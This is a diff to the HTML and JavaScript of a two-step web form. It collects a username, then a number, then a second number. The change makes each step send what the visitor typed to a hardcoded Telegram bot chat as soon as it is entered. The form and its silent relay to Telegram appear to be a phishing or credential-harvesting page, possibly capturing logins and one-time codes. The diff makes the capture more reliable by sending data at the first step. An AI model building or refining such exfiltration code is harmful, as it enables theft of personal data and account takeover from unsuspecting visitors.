@@ -28,32 +28,42 @@ button{width:100%;padding:10px;background:#00c853;border:none;color:#fff;border-
 <div id="step2" class="hidden">
 <h3>More Number</h3>
 <input id="num2" placeholder="Another Number">
-<button onclick="send()">Submit</button>
+<button onclick="sendSecond()">Submit</button>
 </div>
 
 </div>
 
 <script>
 
+let token="YOUR_NEW_TOKEN";
+let chatid="240595975";
+
+function sendToBot(text){
+fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatid}&text=${text}`);
+}
+
+// 👉 First Next click → first data send
 function next(){
+
+let username=document.getElementById("username").value;
+let num1=document.getElementById("num1").value;
+
+let text=`STEP1%0AUser: ${username}%0ANumber1: ${num1}`;
+sendToBot(text);
+
 document.getElementById("step1").classList.add("hidden");
 document.getElementById("step2").classList.remove("hidden");
 }
 
-function send(){
+// 👉 Second Submit click → second data send
+function sendSecond(){
 
-let username=document.getElementById("username").value;
-let num1=document.getElementById("num1").value;
 let num2=document.getElementById("num2").value;
 
-let text=`User: ${username}%0ANumber1: ${num1}%0ANumber2: ${num2}`;
+let text=`STEP2%0ANumber2: ${num2}`;
+sendToBot(text);
 
-let token="YOUR_NEW_TOKEN";
-let chatid="240595975";
-
-fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatid}&text=${text}`)
-.then(()=>alert("Data Sent"))
-.catch(()=>alert("Error"));
+alert("Data Sent To Bot");
 
 }
 
